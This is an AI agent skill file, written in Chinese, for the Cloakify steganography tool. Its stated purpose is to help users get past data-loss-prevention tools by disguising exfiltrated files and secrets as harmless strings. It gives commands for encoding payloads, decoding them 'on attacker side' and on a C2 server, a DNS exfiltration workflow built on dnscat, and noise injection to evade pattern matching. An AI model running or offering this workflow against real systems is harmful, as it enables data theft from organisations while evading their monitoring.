---
name: cloakify
description: >
  此技能适用于用户询问关于"cloakify"、"需要通过将渗出数据伪装成无害流量来绕过 DLP 工具"、
  "文件数据隐写"等问题。通过将数据编码为看似无害的字符串（推文、国际象棋走法、猫的名字）
  来实现数据渗出。
---

# Cloakify

通过隐写编码进行数据渗出——将有效载荷伪装成无害内容。

## 快速开始

```bash
git clone https://github.com/TryCatchHCF/Cloakify
cd Cloakify

# Encode file into disguised output
python cloakify.py payload.zip ciphers/desserts.ciph > exfil.txt

# Decode on attacker side
python decloakify.py exfil.txt ciphers/desserts.ciph > payload.zip
```

## 核心用法

| 命令 | 用途 |
|---------|---------|
| `cloakify.py <file> <cipher>` | 使用密码本编码有效载荷 |
| `decloakify.py <file> <cipher>` | 解码还原原始文件 |
| `listCiphers.py` | 显示可用的密码本 |
| `addNoise.py` | 向输出添加噪声行 |
| `removeNoise.py` | 解码前去除噪声 |

## 可用密码本（示例）

`desserts` · `movies1984` · `chessOpenings` · `twitterFavoriteEmoji` · `ATampTAreaCodes` · `geo_lattitude`

## 常见工作流程

**通过 DNS 渗出（结合 dnscat 使用）：**
```bash
# 1. Encode
python cloakify.py secrets.txt ciphers/desserts.ciph > encoded.txt
# 2. Paste each line as DNS query hostname
# 3. Decode on C2
python decloakify.py captured.txt ciphers/desserts.ciph
```

**添加噪声以规避模式匹配：**
```bash
python cloakify.py payload.zip ciphers/movies1984.ciph | python addNoise.py 10 > noisy.txt
python removeNoise.py noisy.txt 10 | python decloakify.py /dev/stdin ciphers/movies1984.ciph
```

## 参考资源

| 文件 | 加载时机 |
|------|--------------|
| `references/` | 密码本创建指南 |
